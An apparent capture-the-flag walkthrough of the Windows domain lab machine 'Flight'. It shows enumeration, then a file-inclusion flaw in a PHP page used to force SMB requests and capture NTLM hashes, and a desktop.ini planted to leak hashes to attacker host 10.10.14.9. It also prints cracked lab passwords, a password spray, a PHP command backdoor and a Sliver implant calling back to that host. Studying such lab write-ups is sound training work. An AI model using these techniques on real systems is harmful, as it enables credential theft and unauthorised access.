### IP
`10.10.11.187`

# Enumeration

### nmap

`nmap -sC -sV 10.10.11.187`
```
Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-24 09:16 EST
Nmap scan report for 10.10.11.187
Host is up (0.046s latency).
Not shown: 988 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Apache httpd 2.4.52 ((Win64) OpenSSL/1.1.1m PHP/8.1.1)
|_http-server-header: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.1
|_http-title: g0 Aviation
| http-methods: 
|_  Potentially risky methods: TRACE
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-02-24 21:16:43Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: flight.htb0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: flight.htb0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
Service Info: Host: G0; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2023-02-24T21:16:47
|_  start_date: N/A
|_clock-skew: 6h59m58s
| smb2-security-mode: 
|   311: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 54.99 seconds

```
* We can add `flight.htb` to `/etc/hosts`
* One thing to note is we also have DNS on this machine.

### whatweb
`whatweb flight.htb`
```
http://flight.htb [200 OK] Apache[2.4.52], Country[RESERVED][ZZ], HTML5, HTTPServer[Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.1], IP[10.10.11.187], JQuery[1.4.2], OpenSSL[1.1.1m], PHP[8.1.1], Script[text/javascript], Title[g0 Aviation]
```
* Nothing looks of interest here
* All of these versions look fine at first glance.

### gobuster

`gobuster dir -u 10.10.11.187 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt`
```
===============================================================
Gobuster v3.3
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.11.187
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.3
[+] Timeout:                 10s
===============================================================
2023/02/24 09:22:12 Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 337] [--> http://10.10.11.187/images/]
/Images               (Status: 301) [Size: 337] [--> http://10.10.11.187/Images/]
/css                  (Status: 301) [Size: 334] [--> http://10.10.11.187/css/]
/js                   (Status: 301) [Size: 333] [--> http://10.10.11.187/js/]
/licenses             (Status: 403) [Size: 420]
/examples             (Status: 503) [Size: 401]
/IMAGES               (Status: 301) [Size: 337] [--> http://10.10.11.187/IMAGES/]
/%20                  (Status: 403) [Size: 301]
/*checkout*           (Status: 403) [Size: 301]
/CSS                  (Status: 301) [Size: 334] [--> http://10.10.11.187/CSS/]
/JS                   (Status: 301) [Size: 333] [--> http://10.10.11.187/JS/]
/phpmyadmin           (Status: 403) [Size: 420]
/webalizer            (Status: 403) [Size: 420]
/*docroot*            (Status: 403) [Size: 301]
/*                    (Status: 403) [Size: 301]
/con                  (Status: 403) [Size: 301]
/http%3A              (Status: 403) [Size: 301]
/**http%3a            (Status: 403) [Size: 301]
/*http%3A             (Status: 403) [Size: 301]
/aux                  (Status: 403) [Size: 301]
/**http%3A            (Status: 403) [Size: 301]
/%C0                  (Status: 403) [Size: 301]
/server-status        (Status: 403) [Size: 420]
/%3FRID%3D2671        (Status: 403) [Size: 301]
/devinmoore*          (Status: 403) [Size: 301]
/200109*              (Status: 403) [Size: 301]
/*dc_                 (Status: 403) [Size: 301]
/*sa_                 (Status: 403) [Size: 301]
/%D8                  (Status: 403) [Size: 301]
/%CF                  (Status: 403) [Size: 301]
/%CE                  (Status: 403) [Size: 301]
/%CD                  (Status: 403) [Size: 301]
/%CC                  (Status: 403) [Size: 301]
/%CB                  (Status: 403) [Size: 301]
/%CA                  (Status: 403) [Size: 301]
/%D0                  (Status: 403) [Size: 301]
/%D1                  (Status: 403) [Size: 301]
/%D7                  (Status: 403) [Size: 301]
/%D6                  (Status: 403) [Size: 301]
/%D5                  (Status: 403) [Size: 301]
/%D4                  (Status: 403) [Size: 301]
/%D3                  (Status: 403) [Size: 301]
/%D2                  (Status: 403) [Size: 301]
/%C9                  (Status: 403) [Size: 301]
/%C8                  (Status: 403) [Size: 301]
/%C1                  (Status: 403) [Size: 301]
/%C2                  (Status: 403) [Size: 301]
/%C7                  (Status: 403) [Size: 301]
/%C6                  (Status: 403) [Size: 301]
/%C5                  (Status: 403) [Size: 301]
/%C4                  (Status: 403) [Size: 301]
/%C3                  (Status: 403) [Size: 301]
/%D9                  (Status: 403) [Size: 301]
/%DF                  (Status: 403) [Size: 301]
/%DE                  (Status: 403) [Size: 301]
/%DD                  (Status: 403) [Size: 301]
/%DB                  (Status: 403) [Size: 301]
/login%3f             (Status: 403) [Size: 301]
/%22julie%20roehm%22  (Status: 403) [Size: 301]
/%22james%20kim%22    (Status: 403) [Size: 301]
/%22britney%20spears%22 (Status: 403) [Size: 301]
===============================================================
2023/02/24 09:25:42 Finished
===============================================================

```
* Once again, we don't find anything interesting

### dnsmap & fierce

* Since we have DNS open, I thought to bruteforce subdomains:

`dnsmap flight.htb`
* This wasn't able to find anything with the default wordlist

`fierce --wide --dns-servers 10.10.11.187 --domain flight.htb`
```
NS: g0.flight.htb.
SOA: g0.flight.htb. (10.10.11.187)
Zone: failure
Wildcard: failure
```
* This told us that `g0.flight.htb` is the name server, which I think should be found some other way, but is useful information. I added it to my hosts file

* We can use `nslookup` to confirm that something exists:
`nslookup`
```
> server 10.10.11.187
Default server: 10.10.11.187
Address: 10.10.11.187#53
> g0.flight.htb
;; communications error to 10.10.11.187#53: timed out
Server:		10.10.11.187
Address:	10.10.11.187#53

Name:	g0.flight.htb
Address: 10.10.11.187
Name:	g0.flight.htb
Address: dead:beef::6439:b344:584e:ecb5
Name:	g0.flight.htb
Address: dead:beef::13d
> flight.htb
;; communications error to 10.10.11.187#53: timed out
Server:		10.10.11.187
Address:	10.10.11.187#53

Name:	flight.htb
Address: 192.168.22.180
> 
```

### gobuster vhost

`gobuster vhost -u flight.htb -w /usr/share/wordlists/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt --append-domain`
```
===============================================================
Gobuster v3.3
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:             http://flight.htb
[+] Method:          GET
[+] Threads:         10
[+] Wordlist:        /usr/share/wordlists/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt
[+] User Agent:      gobuster/3.3
[+] Timeout:         10s
[+] Append Domain:   true
===============================================================
2023/02/24 09:44:56 Starting gobuster in VHOST enumeration mode
===============================================================
Found: school.flight.htb Status: 200 [Size: 3996]
Found: *.flight.htb Status: 400 [Size: 326]
===============================================================
2023/02/24 09:53:22 Finished
===============================================================

```
* We can add `school.flight.htb` to our hosts file and we now see a new website!

# Exploitation

### LFI

* One thing that is interesting is that the website seems to be a php page but renders html pages using a `view` parameter:

```
http://school.flight.htb/index.php?view=blogfilter
```

* I thought there might be some local file inclusion through directory traversal, but inputting "..\" or any other variation always got me a `"Suspicious Activity Blocked!"` response.
	* I also tried fuzzing the input and found out that they are blocking anything with the following in it:

```
..
\
filter
htaccess
```

* Unfortunately nothing really worked there.
* Luckily, I eventually realized that we can view the source of the page itself using the view parameter:

```
http://school.flight.htb/index.php?view=index.php
```

* We can see the source:
```php
<?php

ini_set('display_errors', 0);
error_reporting(E_ERROR | E_WARNING | E_PARSE); 

if(isset($_GET['view'])){
$file=$_GET['view'];
if ((strpos(urldecode($_GET['view']),'..')!==false)||
    (strpos(urldecode(strtolower($_GET['view'])),'filter')!==false)||
    (strpos(urldecode($_GET['view']),'\\')!==false)||
    (strpos(urldecode($_GET['view']),'htaccess')!==false)||
    (strpos(urldecode($_GET['view']),'.shtml')!==false)
){
    echo "<h1>Suspicious Activity Blocked!";
    echo "<h3>Incident will be reported</h3>\r\n";
}else{
    echo file_get_contents($_GET['view']);	
}
}else{
    echo file_get_contents("C:\\xampp\\htdocs\\school.flight.htb\\home.html");
}
	
?>
```
* Looks like we were pretty on-the-dot for the filtered phrases. 
	* Importantly, this filters backslashes but doesn't filter forwardslashes (which also work in windows)
* One thing that is useful is that we now know the full path of the files

* We can also see that casing doesn't matter in the filters



* Based on the [default](https://practicalsbs.wordpress.com/2012/05/23/xampp-1-7-3-for-windows-folder-structure/) `xampp` installation, I tried to find files to leak.
	* Here are some I found:
```
http://school.flight.htb/index.php?view=C:/xampp/apache/conf/httpd.conf
http://school.flight.htb/index.php?view=C:/xampp/php/php.ini
```

### Responder

Since this is a windows machine and our website is accessing windows files, we can try to make it access a share. If LLMNR is enabled, we can use `Responder` to capture the hash of the machine when we try to make it make a request to a fake share.


We can run responder with `sudo Responder.py -I tun0` and then make it request a random share:

```
http://school.flight.htb/index.php?view=//<tun0>/fakeShare/fakeFile
```

We then receive an NTLM hash in responder:

```
svc_apache::flight:d6e67fda3151bcec:EB7E5585363A7439240984EDB0603F76:0101000000000000809416D35648D901A409A0D734CDFD020000000002000800460053004500330001001E00570049004E002D005800560049004F004B0038003500480054005A00490004003400570049004E002D005800560049004F004B0038003500480054005A0049002E0046005300450033002E004C004F00430041004C000300140046005300450033002E004C004F00430041004C000500140046005300450033002E004C004F00430041004C0007000800809416D35648D901060004000200000008003000300000000000000000000000003000000837682DDB8BCAA9C61AC7A832FE85586E386A5CC53B209CAF42E16F71C8DDAB0A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00340038000000000000000000
```

We can crack this hash using `hashcat hash /usr/share/wordlists/rockyou.txt`

We get the following credentials:

`SVC_APACHE:S@Ss!K@*t13`


### CME

Now that we have credentials, we can try to use them to log in

`cme smb 10.10.11.187 'svc_apache' -p 'S@Ss!K@*t13' `

This doesn't seem to get us anywhere (we also cannot log in through winrm)


However, we can do some enumeration:

`cme smb 10.10.11.187 -u 'svc_apache' -p 'S@Ss!K@*t13' --groups --local-groups --loggedon-users --rid-brute --sessions --users --shares --pass-pol`
```
SMB         10.10.11.187    445    G0               [*] Windows 10.0 Build 17763 x64 (name:G0) (domain:flight.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.187    445    G0               [+] flight.htb\svc_apache:S@Ss!K@*t13 
SMB         10.10.11.187    445    G0               [+] Enumerated shares
SMB         10.10.11.187    445    G0               Share           Permissions     Remark
SMB         10.10.11.187    445    G0               -----           -----------     ------
SMB         10.10.11.187    445    G0               ADMIN$                          Remote Admin
SMB         10.10.11.187    445    G0               C$                              Default share
SMB         10.10.11.187    445    G0               IPC$            READ            Remote IPC
SMB         10.10.11.187    445    G0               NETLOGON        READ            Logon server share 
SMB         10.10.11.187    445    G0               Shared          READ            
SMB         10.10.11.187    445    G0               SYSVOL          READ            Logon server share 
SMB         10.10.11.187    445    G0               Users           READ            
SMB         10.10.11.187    445    G0               Web             READ            
SMB         10.10.11.187    445    G0               [+] Enumerated sessions
SMB         10.10.11.187    445    G0               [+] Enumerated loggedon users
SMB         10.10.11.187    445    G0               [-] Error enumerating domain users using dc ip 10.10.11.187: unsupported hash type MD4
SMB         10.10.11.187    445    G0               [*] Trying with SAMRPC protocol
SMB         10.10.11.187    445    G0               [+] Enumerated domain user(s)
SMB         10.10.11.187    445    G0               flight.htb\Administrator                  Built-in account for administering the computer/domain
SMB         10.10.11.187    445    G0               flight.htb\Guest                          Built-in account for guest access to the computer/domain
SMB         10.10.11.187    445    G0               flight.htb\krbtgt                         Key Distribution Center Service Account
SMB         10.10.11.187    445    G0               flight.htb\S.Moon                         Junion Web Developer
SMB         10.10.11.187    445    G0               flight.htb\R.Cold                         HR Assistant
SMB         10.10.11.187    445    G0               flight.htb\G.Lors                         Sales manager
SMB         10.10.11.187    445    G0               flight.htb\L.Kein                         Penetration tester
SMB         10.10.11.187    445    G0               flight.htb\M.Gold                         Sysadmin
SMB         10.10.11.187    445    G0               flight.htb\C.Bum                          Senior Web Developer
SMB         10.10.11.187    445    G0               flight.htb\W.Walker                       Payroll officer
SMB         10.10.11.187    445    G0               flight.htb\I.Francis                      Nobody knows why he's here
SMB         10.10.11.187    445    G0               flight.htb\D.Truff                        Project Manager
SMB         10.10.11.187    445    G0               flight.htb\V.Stevens                      Secretary
SMB         10.10.11.187    445    G0               flight.htb\svc_apache                     Service Apache web
SMB         10.10.11.187    445    G0               flight.htb\O.Possum                       Helpdesk
SMB         10.10.11.187    445    G0               [-] Error enumerating domain group using dc ip 10.10.11.187: unsupported hash type MD4
SMB         10.10.11.187    445    G0               [-] Error enumerating local groups of 10.10.11.187: unsupported hash type MD4
SMB         10.10.11.187    445    G0               [+] Dumping password info for domain: flight
SMB         10.10.11.187    445    G0               Minimum password length: 7
SMB         10.10.11.187    445    G0               Password history length: 24
SMB         10.10.11.187    445    G0               Maximum password age: 41 days 23 hours 53 minutes 
SMB         10.10.11.187    445    G0               
SMB         10.10.11.187    445    G0               Password Complexity Flags: 000001
SMB         10.10.11.187    445    G0                   Domain Refuse Password Change: 0
SMB         10.10.11.187    445    G0                   Domain Password Store Cleartext: 0
SMB         10.10.11.187    445    G0                   Domain Password Lockout Admins: 0
SMB         10.10.11.187    445    G0                   Domain Password No Clear Change: 0
SMB         10.10.11.187    445    G0                   Domain Password No Anon Change: 0
SMB         10.10.11.187    445    G0                   Domain Password Complex: 1
SMB         10.10.11.187    445    G0               
SMB         10.10.11.187    445    G0               Minimum password age: 1 day 4 minutes 
SMB         10.10.11.187    445    G0               Reset Account Lockout Counter: 30 minutes 
SMB         10.10.11.187    445    G0               Locked Account Duration: 30 minutes 
SMB         10.10.11.187    445    G0               Account Lockout Threshold: None
SMB         10.10.11.187    445    G0               Forced Log off Time: Not Set
SMB         10.10.11.187    445    G0               [+] Brute forcing RIDs
SMB         10.10.11.187    445    G0               498: flight\Enterprise Read-only Domain Controllers (SidTypeGroup)
SMB         10.10.11.187    445    G0               500: flight\Administrator (SidTypeUser)
SMB         10.10.11.187    445    G0               501: flight\Guest (SidTypeUser)
SMB         10.10.11.187    445    G0               502: flight\krbtgt (SidTypeUser)
SMB         10.10.11.187    445    G0               512: flight\Domain Admins (SidTypeGroup)
SMB         10.10.11.187    445    G0               513: flight\Domain Users (SidTypeGroup)
SMB         10.10.11.187    445    G0               514: flight\Domain Guests (SidTypeGroup)
SMB         10.10.11.187    445    G0               515: flight\Domain Computers (SidTypeGroup)
SMB         10.10.11.187    445    G0               516: flight\Domain Controllers (SidTypeGroup)
SMB         10.10.11.187    445    G0               517: flight\Cert Publishers (SidTypeAlias)
SMB         10.10.11.187    445    G0               518: flight\Schema Admins (SidTypeGroup)
SMB         10.10.11.187    445    G0               519: flight\Enterprise Admins (SidTypeGroup)
SMB         10.10.11.187    445    G0               520: flight\Group Policy Creator Owners (SidTypeGroup)
SMB         10.10.11.187    445    G0               521: flight\Read-only Domain Controllers (SidTypeGroup)
SMB         10.10.11.187    445    G0               522: flight\Cloneable Domain Controllers (SidTypeGroup)
SMB         10.10.11.187    445    G0               525: flight\Protected Users (SidTypeGroup)
SMB         10.10.11.187    445    G0               526: flight\Key Admins (SidTypeGroup)
SMB         10.10.11.187    445    G0               527: flight\Enterprise Key Admins (SidTypeGroup)
SMB         10.10.11.187    445    G0               553: flight\RAS and IAS Servers (SidTypeAlias)
SMB         10.10.11.187    445    G0               571: flight\Allowed RODC Password Replication Group (SidTypeAlias)
SMB         10.10.11.187    445    G0               572: flight\Denied RODC Password Replication Group (SidTypeAlias)
SMB         10.10.11.187    445    G0               1000: flight\Access-Denied Assistance Users (SidTypeAlias)
SMB         10.10.11.187    445    G0               1001: flight\G0$ (SidTypeUser)
SMB         10.10.11.187    445    G0               1102: flight\DnsAdmins (SidTypeAlias)
SMB         10.10.11.187    445    G0               1103: flight\DnsUpdateProxy (SidTypeGroup)
SMB         10.10.11.187    445    G0               1602: flight\S.Moon (SidTypeUser)
SMB         10.10.11.187    445    G0               1603: flight\R.Cold (SidTypeUser)
SMB         10.10.11.187    445    G0               1604: flight\G.Lors (SidTypeUser)
SMB         10.10.11.187    445    G0               1605: flight\L.Kein (SidTypeUser)
SMB         10.10.11.187    445    G0               1606: flight\M.Gold (SidTypeUser)
SMB         10.10.11.187    445    G0               1607: flight\C.Bum (SidTypeUser)
SMB         10.10.11.187    445    G0               1608: flight\W.Walker (SidTypeUser)
SMB         10.10.11.187    445    G0               1609: flight\I.Francis (SidTypeUser)
SMB         10.10.11.187    445    G0               1610: flight\D.Truff (SidTypeUser)
SMB         10.10.11.187    445    G0               1611: flight\V.Stevens (SidTypeUser)
SMB         10.10.11.187    445    G0               1612: flight\svc_apache (SidTypeUser)
SMB         10.10.11.187    445    G0               1613: flight\O.Possum (SidTypeUser)
SMB         10.10.11.187    445    G0               1614: flight\WebDevs (SidTypeGroup)

```

Based on this, we can see a list of shares that we can read and a list of other users

I tried enumerating the smb shares for sensitive files and didn't find anything, but we do have this list:

```
flight.htb\Administrator  
flight.htb\Guest          
flight.htb\krbtgt         
flight.htb\S.Moon         
flight.htb\R.Cold         
flight.htb\G.Lors         
flight.htb\L.Kein         
flight.htb\M.Gold         
flight.htb\C.Bum          
flight.htb\W.Walker       
flight.htb\I.Francis      
flight.htb\D.Truff        
flight.htb\V.Stevens      
flight.htb\svc_apache     
flight.htb\O.Possum       
```

We can also see the password policy:

```
Minimum password length: 7
Password history length: 24
Maximum password age: 41 days 23 hours 53 minutes 

Password Complexity Flags: 000001
    Domain Refuse Password Change: 0
    Domain Password Store Cleartext: 0
    Domain Password Lockout Admins: 0
    Domain Password No Clear Change: 0
    Domain Password No Anon Change: 0
    Domain Password Complex: 1

Minimum password age: 1 day 4 minutes 
Reset Account Lockout Counter: 30 minutes 
Locked Account Duration: 30 minutes 
Account Lockout Threshold: None
Forced Log off Time: Not Set
```


We can check to see if any other users have the same password by running the following command:

`cme smb 10.10.11.187 -u users -p 'S@Ss!K@*t13'`

We can see from this that `S.Moon` has the same password 


We can now use `cme` again to enumerate shares permissions with the new user:

`cme smb 10.10.11.187 -u S.Moon -p 'S@Ss!K@*t13' --shares` and we can see that, different from the apache service account, `S.Moon` can write to the `Shared` share
```
SMB         10.10.11.187    445    G0               [*] Windows 10.0 Build 17763 x64 (name:G0) (domain:flight.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.187    445    G0               [+] flight.htb\S.Moon:S@Ss!K@*t13 
SMB         10.10.11.187    445    G0               [+] Enumerated shares
SMB         10.10.11.187    445    G0               Share           Permissions     Remark
SMB         10.10.11.187    445    G0               -----           -----------     ------
SMB         10.10.11.187    445    G0               ADMIN$                          Remote Admin
SMB         10.10.11.187    445    G0               C$                              Default share
SMB         10.10.11.187    445    G0               IPC$            READ            Remote IPC
SMB         10.10.11.187    445    G0               NETLOGON        READ            Logon server share 
SMB         10.10.11.187    445    G0               Shared          READ,WRITE      
SMB         10.10.11.187    445    G0               SYSVOL          READ            Logon server share 
SMB         10.10.11.187    445    G0               Users           READ            
SMB         10.10.11.187    445    G0               Web             READ            
```

We can log in to this using `smbclient -U S.Moon //10.10.11.187/Shared`


### NTLM Hash Theft

Since we can write to a share and the website can access and execute php files in the shares, I initially thought we could upload a php reverse shell and execute it.

Unfortunately, it seems that the `S.Moon` user can only write some files to the share.

One of these files is `desktop.ini`. We can leverage this to steal an ntlm hash of any user that access the file. [Source](https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/)

We can have the following in a `desktop.ini` file:

```
[.ShellClassInfo]
IconResource=\\10.10.14.9\totallyFakeShare
```

Because the `desktop.ini` file determines how a folder is rendered and because we set the icon to a fake file in our share, any user that attempts to access that share will send over their NTLM hash to responder in the same was as before

We can try to crack this hash the same as previously and we get new credentials:

`c.bum:Tikkycoll_431012284`

We can enumerate the shares `c.bum` can access as we did before and we can see that they can write to the `Web` share

`cme smb 10.10.11.187 -u c.bum -p Tikkycoll_431012284 --shares`
```
SMB         10.10.11.187    445    G0               [*] Windows 10.0 Build 17763 x64 (name:G0) (domain:flight.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.187    445    G0               [+] flight.htb\c.bum:Tikkycoll_431012284 
SMB         10.10.11.187    445    G0               [+] Enumerated shares
SMB         10.10.11.187    445    G0               Share           Permissions     Remark
SMB         10.10.11.187    445    G0               -----           -----------     ------
SMB         10.10.11.187    445    G0               ADMIN$                          Remote Admin
SMB         10.10.11.187    445    G0               C$                              Default share
SMB         10.10.11.187    445    G0               IPC$            READ            Remote IPC
SMB         10.10.11.187    445    G0               NETLOGON        READ            Logon server share 
SMB         10.10.11.187    445    G0               Shared          READ,WRITE      
SMB         10.10.11.187    445    G0               SYSVOL          READ            Logon server share 
SMB         10.10.11.187    445    G0               Users           READ            
SMB         10.10.11.187    445    G0               Web             READ,WRITE
```

### Remote File Inclusion

Since we have a user that can write to the `Web` share (which has all the files that the website renders), we can try to do the same attack that we tried previously.

`smbclient //10.10.11.187/Web -U C.bum`

I tried to upload the file to the `school` subdomain, but it didn't execute the code. Thus, we can try to upload this file into the `flight.htb` directory and set up a listener with `nc -lvnp 9999`

We can then access it on the webpage to execute.

Unfortunately, my payload of choice (I originally used the pentestmonkey `php-reverse-shell.php`) seemed to be having some issues on this particular machine

Instead, I used a simple `cmd.php` file that will execute any commands given to it as a GET parameter, which seemed to work.

Since our goal is still to get a reverse shell, I'm going to use sliver to execute commands

#### sliver

We can generate a payload with `generate --mtls 10.10.14.9` and start a listener with `mtls`

We can then upload that file and run execute the file with our php backdoor 

# Lateral Movement


When we run `whoami`, we can see that we are `flight\svc_apache`

Unfortunately, it seems that this user cannot read the contents of the `C.Bum` user folder. However, since we have the credentials for that user, we can try to switch users.

We can impersonate a user using credentials in sliver using the following command:

`make-token --username 'C.Bum' --password 'Tikkycoll_431012284' --domain flight --logon-type LOGON_INTERACTIVE`

If this doesn't work, we can also get a new session by using `runas` with our original payload:

`runas --username C.Bum --password Tikkycoll_431012284 --process IMPORTANT_ALLERGIST.exe`

We can now get the user flag in `C:\Users\C.Bum\Desktop\user.txt`


